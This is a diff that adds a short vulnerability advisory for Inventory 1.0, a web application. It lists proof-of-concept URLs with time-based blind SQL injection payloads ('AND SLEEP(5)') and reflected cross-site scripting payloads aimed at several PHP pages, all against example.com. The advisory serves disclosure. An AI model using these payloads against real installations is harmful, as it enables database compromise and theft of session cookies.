@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/56293/info
+
+Inventory is prone to multiple cross-site scripting and SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Inventory 1.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/inventory/consulta_fact.php?fact_num=17 AND SLEEP(5)
+http://www.example.com/inventory/addinventario.php?ref=555-555-0199@example.com'AND SLEEP(5) AND 'EJxe'='EJxe&sn=555-555- 0199@example.com' AND SLEEP(5) AND 'IgkP'='IgkP&factura=555-555-0199@example.com' AND SLEEP(5) AND 'CFdY'='CFdY
+http://www.example.com/inventory/newtransact.php?ref=RSC-280' AND SLEEP(5) AND 'wIUB'='wIUB
+http://www.example.com/inventory/consulta_fact.php?fact_num=<script>alert(1)</script>
+http://www.example.com/inventory/newinventario.php?sn=<script>alert(100)</script>
+http://www.example.com/inventory/newtransact.php?ref=<script>alert(100)</script> 
